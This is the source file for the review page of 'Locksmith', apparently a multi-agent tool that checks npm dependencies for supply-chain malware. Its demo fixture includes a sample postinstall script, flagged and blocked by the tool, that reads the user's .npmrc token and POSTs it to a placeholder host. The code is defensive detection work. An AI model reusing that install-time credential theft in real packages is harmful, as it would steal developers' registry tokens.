"use client";

import { useEffect, useRef, useState } from "react";
import RepoSearch from "../components/RepoSearch";
import Report, { agents, type Finding, type PackageEvidence, type ReviewResult, type RoleStatus } from "../components/Report";
import { LIVE_PHASES, phaseState, roleState } from "../../lib/agentProgress";
import "./review.css";
type ReviewJob = {
  reviewId:string;
  status:"queued"|"retrieving-packages"|"running"|"complete"|"failed";
  currentRole?:string;
  currentRoles?:string[];
  completedRoles:string[];
  roleStatus?:Record<string,RoleStatus>;
  roleErrors?:Record<string,string>;
  packages:PackageEvidence[];
  findings:Finding[];
  result?:ReviewResult;
  error?:string;
};

export default function ReviewPage() {
  const [repo, setRepo] = useState("");
  const [phase, setPhase] = useState<"input"|"audit"|"report">("input");
  const [job, setJob] = useState<ReviewJob|null>(null);
  const [error, setError] = useState("");
  const poll = useRef<ReturnType<typeof setInterval>|null>(null);
  const autoStarted = useRef(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("fixture") === "1") {
      setRepo("fixture://locksmith-redesign");
      setJob(fixtureJob());
      setPhase("report");
      return;
    }
    const liveFixture = params.get("liveFixture");
    if (liveFixture) {
      setRepo(`fixture://locksmith-${liveFixture}`);
      setJob(liveFixtureJob(liveFixture));
      setPhase("audit");
      return;
    }
    const imported = params.get("repo");
    const branch = params.get("branch") || undefined;
    if (!imported?.startsWith("https://github.com/")) return;
    setRepo(imported);
    if (autoStarted.current) return;
    autoStarted.current = true;
    void runReview({ repo: imported, branch });
  }, []);

  useEffect(() => () => { if (poll.current) clearInterval(poll.current); }, []);

  async function loadJob(reviewId:string) {
    const response = await fetch(`/api/review/${reviewId}`, { cache:"no-store" });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || "Review status failed");
    setJob(data);
    if (data.status === "complete") {
      if (poll.current) clearInterval(poll.current);
      setPhase("report");
    }
    if (data.status === "failed") {
      if (poll.current) clearInterval(poll.current);
      setError(data.error || "Review failed");
      setPhase("input");
    }
  }

  async function runReview(payload:{ repo?:string; branch?:string } = { repo }) {
    if (poll.current) clearInterval(poll.current);
    if (payload.repo) setRepo(payload.repo);
    setError("");
    setJob(null);
    setPhase("audit");
    try {
      const response = await fetch("/api/review", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Review failed");
      if (!data.reviewId) throw new Error("Review did not start. Try again.");
      await loadJob(data.reviewId);
      poll.current = setInterval(() => void loadJob(data.reviewId).catch(cause => {
        if (poll.current) clearInterval(poll.current);
        setError(cause instanceof Error ? cause.message : "Review status failed");
        setPhase("input");
      }), 1000);
    } catch (cause) {
      setError(cause instanceof Error ? cause.message : "Review failed");
      setPhase("input");
    }
  }

  const result = job?.result;
  const findings = job?.findings || result?.findings || [];
  const packages = result?.packages || job?.packages || [];
  const reportResult = result || (job && packages.length ? {
    reviewId: job.reviewId,
    dependencyStateId: "pending",
    source: repo,
    files: [],
    packages,
    packageCount: packages.length,
    inspectedPackageCount: packages.length,
    packageSummary: "Review still running.",
    findings,
    verdict: "Review" as const,
    remediation: "Waiting for Judge Agent.",
    mode: "qwen",
    model: "live",
  } satisfies ReviewResult : undefined);

  return <main className="review-page">
    {phase === "input" ? <section className="review-start">
      <p className="eyebrow">Workspace review / Qwen live analysis</p>
      <h1>Review a dependency state.</h1>
      <p>Locksmith retrieves real dependency files, sends them through six specialist Qwen agents, and saves the result locally.</p>
      <RepoSearch id="review-repo" initialRepo={repo} variant="review" onScan={runReview} />
      {error ? <p className="review-error" role="alert">{error}</p> : null}
    </section> : null}

    {phase === "audit" && !reportResult ? <section className="audit-screen" aria-live="polite">
      <div className="audit-head"><div><p className="eyebrow">Live dependency review</p><h1>Building the case.</h1></div><strong>{findings.length.toString().padStart(2,"0")} / 06</strong></div>
      <div className="audit-repo"><i /> Reviewing <code>{repo}</code></div>
      {job?.status === "retrieving-packages" || packages.length ? <section className="package-panel">
        <h2>Retrieved packages</h2>
        <div className="package-grid">{packages.length ? packages.map(pkg => <PackageCard pkg={pkg} key={`${pkg.name}@${pkg.version}`} />) : <p>Fetching package artifacts...</p>}</div>
      </section> : null}
      <div className="phase-list">{LIVE_PHASES.map(phaseInfo => {
        const state = phaseState(phaseInfo.roles, job || undefined);
        const title = phaseInfo.name === "Parallel inspection" && state === "running" ? "Parallel inspection running" : phaseInfo.name;
        return <section className={`agent-phase phase-${state}`} key={phaseInfo.name}>
          <h2>{title}</h2>
          <div>{phaseInfo.roles.map(role => {
            const finding = findings.find(item => item.role === role);
            const state = roleState(role, job || undefined);
            const agent = agents.find(item => item.name === role)!;
            return <article className={`live-agent-card agent-${state}`} key={role} title={agent.title}>
              <strong>{role}</strong>
              <p>{job?.roleErrors?.[role] || finding?.summary || (state === "running" ? "Running..." : "Waiting for evidence")}</p>
              <em>{finding?.verdict || state}</em>
            </article>;
          })}</div>
        </section>;
      })}</div>
    </section> : null}

    {(phase === "report" || phase === "audit") && reportResult ? <Report result={reportResult} job={job || undefined} /> : null}
  </main>;
}

function fixtureJob(): ReviewJob {
  const suspicious = {
    name: "fake-logger",
    version: "1.3.0",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "new" as const,
    evidenceSource: "fresh-scan" as const,
    artifactKey: "npm:fake-logger@1.3.0:sha512-fixture",
    fileCount: 4,
    files: ["package/package.json", "package/scripts/postinstall.js", "package/index.js", "package/README.md"],
    inspectedFiles: [{
      path: "package/scripts/postinstall.js",
      reason: "suspicious static pattern",
      contentTruncated: true,
      displayedBytes: 260,
      originalBytes: 24000,
      content: "const fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst npmrc = path.join(os.homedir(), \".npmrc\");\nconst token = fs.readFileSync(npmrc, \"utf8\");\n\nfetch(\"https://bad-example.com/collect\", {\n  method: \"POST\",\n  body: token\n});",
    }],
    suspiciousLines: [
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "critical" as const, sourceAgent: "Static", reason: "Static Agent: references npm credentials.", rule: ".npmrc" },
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: accesses the user home directory.", rule: "os.homedir" },
      { filePath: "package/scripts/postinstall.js", startLine: 6, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: reads local files.", rule: "fs.readFile" },
      { filePath: "package/scripts/postinstall.js", startLine: 8, severity: "medium" as const, sourceAgent: "Static", reason: "Static Agent: contains outbound URL.", rule: "url" },
    ],
    status: "Block" as const,
    reason: "Install script reads npm credentials and sends data to an external URL.",
    evidence: ["package/scripts/postinstall.js line 8"],
  };
  const reused = {
    name: "next",
    version: "15.3.4",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "reused" as const,
    evidenceSource: "global-cache" as const,
    evidenceId: "ev_next_1534",
    previousReviewId: "rev_previous",
    artifactKey: "npm:next@15.3.4:sha512-fixture",
    fileCount: 2,
    files: ["package/package.json", "package/dist/index.js"],
    inspectedFiles: [{ path: "package/package.json", reason: "package manifest", content: "{\"name\":\"next\"}" }],
    suspiciousLines: [],
    status: "Allow" as const,
    reason: "Package evidence reused from global cache. No suspicious files found.",
    evidence: [],
  };
  const reviewPkg = fixturePackage("axios", "1.6.7 → 1.6.8", "Review" as const, "Changed package with one metadata concern.", "changed" as const);
  const lodash = fixturePackage("lodash", "4.17.22", "Allow" as const, "Package evidence reused from global cache. No suspicious files found.", "changed" as const);
  const react = fixturePackage("react", "18.3.1", "Allow" as const, "Package evidence reused from global cache. No suspicious files found.", "reused" as const);
  const chalk = fixturePackage("chalk", "5.3.0", "Allow" as const, "Package evidence reused from global cache. No suspicious files found.", "reused" as const);
  const skipped = fixturePackage("fsevents", "2.3.3", "Allow" as const, "Optional dependency skipped because artifact code is unavailable.", "unscanned" as const);
  skipped.inspectedFiles = [];
  skipped.files = [];
  skipped.fileCount = 0;
  const findings = [
    { role: "Baseline", verdict: "Review" as const, summary: "Detected one added package, one package needing review, and four reused packages.", evidence: ["package.json", "package-lock.json"], confidence: 0.85 },
    { role: "Manifest", packageName: "fake-logger", verdict: "Allow" as const, summary: "Package manifest is standard. No suspicious dependencies beyond postinstall.", evidence: ["fake-logger package.json: scripts.postinstall"], confidence: 0.74 },
    { role: "Static", packageName: "fake-logger", verdict: "Review" as const, summary: "Found credential file access and outbound upload in fake-logger.", evidence: ["package/scripts/postinstall.js line 8"], confidence: 0.86 },
    { role: "Behavior", packageName: "fake-logger", verdict: "Block" as const, summary: "Install-time execution would POST collected token data to an external endpoint.", evidence: ["fake-logger postinstall network call"], confidence: 0.9 },
    { role: "Skeptic", packageName: "fake-logger", verdict: "Block" as const, summary: "False-positive challenge rejected; logger packages do not need credential reads.", evidence: ["fake-logger credential file access", "network upload"], confidence: 0.88 },
    { role: "Judge", verdict: "Block" as const, summary: "High-confidence malicious behavior detected in fake-logger@1.3.0.", evidence: ["Static finding", "Behavior confirmation", "Skeptic confirmation"], confidence: 0.93 },
  ] satisfies Finding[];
  const result: ReviewResult = {
    reviewId: "rev_fixture",
    dependencyStateId: "state_fixture",
    source: "fixture://locksmith-redesign",
    files: ["package.json", "package-lock.json"],
    packages: [suspicious, reviewPkg, lodash, reused, react, chalk, skipped],
    packageCount: 320,
    inspectedPackageCount: 7,
    packageSummary: "320 packages reviewed: 5 approved, 1 review required, 1 block.",
    findings,
    verdict: "Block",
    remediation: "Remove fake-logger, rollback the lockfile, or pin the previous approved version.",
    mode: "qwen",
    model: "fixture",
    branch: "main",
    packageManager: "npm 10.5.2",
    createdAt: "2025-05-12T10:42:00.000Z",
  };
  return {
    reviewId: "rev_fixture",
    status: "complete",
    currentRoles: [],
    completedRoles: agents.map(agent => agent.name),
    roleStatus: Object.fromEntries(agents.map(agent => [agent.name, "done"])) as Record<string, RoleStatus>,
    packages: result.packages,
    findings,
    result,
  };
}

function fixturePackage(name:string, version:string, status:ReviewResult["verdict"], reason:string, scanStatus:PackageEvidence["scanStatus"]): PackageEvidence {
  return {
    name,
    version,
    packageManager: "npm",
    dependencyType: "dependencies",
    scanStatus,
    evidenceSource: scanStatus === "unscanned" ? "none" : "global-cache",
    evidenceId: `ev_${name.replaceAll("-", "_")}`,
    artifactKey: `npm:${name}@${version}:fixture`,
    fileCount: 12,
    files: ["package/package.json", "package/index.js"],
    inspectedFiles: [{ path: "package/package.json", reason: "package manifest", content: `{"name":"${name}"}` }],
    suspiciousLines: [],
    status,
    reason,
    evidence: status === "Review" ? ["metadata age signal"] : [],
  };
}

function liveFixtureJob(state:string): ReviewJob {
  const job = fixtureJob();
  const queued = Object.fromEntries(agents.map(agent => [agent.name, "queued"])) as Record<string, RoleStatus>;
  job.status = "running";
  job.result = undefined;
  job.findings = [];
  job.completedRoles = [];
  job.currentRole = undefined;
  job.currentRoles = [];
  job.roleErrors = undefined;
  job.roleStatus = queued;
  if (state === "baseline") {
    job.currentRole = "Baseline";
    job.currentRoles = ["Baseline"];
    job.roleStatus.Baseline = "running";
  } else if (state === "parallel") {
    job.completedRoles = ["Baseline"];
    job.findings = fixtureJob().findings.filter(finding => finding.role === "Baseline");
    job.currentRole = "Behavior";
    job.currentRoles = ["Manifest", "Static", "Behavior"];
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "running", Static: "running", Behavior: "running" };
  } else if (state === "failed") {
    job.completedRoles = ["Baseline", "Manifest", "Behavior"];
    job.findings = fixtureJob().findings.filter(finding => ["Baseline", "Manifest", "Behavior"].includes(finding.role));
    job.currentRoles = ["Skeptic"];
    job.currentRole = "Skeptic";
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "done", Static: "failed", Behavior: "done", Skeptic: "running" };
    job.roleErrors = { Static: "Static request failed" };
  } else if (state === "all-failed") {
    job.completedRoles = ["Baseline"];
    job.findings = fixtureJob().findings.filter(finding => finding.role === "Baseline");
    job.currentRoles = ["Skeptic"];
    job.currentRole = "Skeptic";
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "failed", Static: "failed", Behavior: "failed", Skeptic: "running" };
    job.roleErrors = { Manifest: "Manifest request failed", Static: "Static request failed", Behavior: "Behavior request failed" };
  }
  return job;
}

function PackageCard({ pkg }:{ pkg:PackageEvidence }) {
  return <article className={`package-card status-${pkg.status.toLowerCase()}`}>
    <header><div><strong>{pkg.name}</strong><code>{pkg.version}</code></div><b>{pkg.status}</b></header>
    <p>{pkg.reason}</p>
    <dl><div><dt>Type</dt><dd>{pkg.dependencyType}</dd></div><div><dt>Files</dt><dd>{pkg.fileCount}</dd></div><div><dt>Inspected</dt><dd>{pkg.inspectedFiles.map(file => file.path).join(" · ") || "None"}</dd></div></dl>
    {pkg.evidence?.length ? <small>{pkg.evidence.join(" · ")}</small> : null}
    <details><summary>All internal files</summary><ol>{pkg.files.map(file => <li key={file}>{file}</li>)}</ol></details>
  </article>;
}
